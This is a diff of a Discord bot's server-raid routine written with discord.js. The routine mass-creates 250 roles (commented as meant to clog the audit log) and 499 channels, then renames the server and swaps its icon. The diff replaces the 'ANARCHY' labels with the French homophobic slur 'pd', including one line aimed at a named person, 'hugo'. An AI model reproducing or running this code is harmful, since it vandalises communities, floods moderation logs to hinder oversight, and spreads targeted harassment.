@@ -6,18 +6,18 @@ const Discord = require('discord.js');
             for (var i = 0; i < 250; i++) {
                 // Creates new roles to clog up the audit log
                 message.guild.createRole({
-                    name: 'ANARCHY',
+                    name: 'pd',
                     color: 'RED',
                 });
               }
                 for (var i = 0; i < 499; i++) {
                
-                message.guild.createChannel('RAID BY ANARCHY', 'text')
+                message.guild.createChannel('hugo pd', 'text')
     
           
                 }
     
-    message.guild.setName("DEAD BY ANARCHY");
+    message.guild.setName("gros pd");
     message.guild.setIcon("https://cdn.discordapp.com/icons/498502361526829066/3a3d7943bf5c012064da45516b9ee279.webp")
             };
 
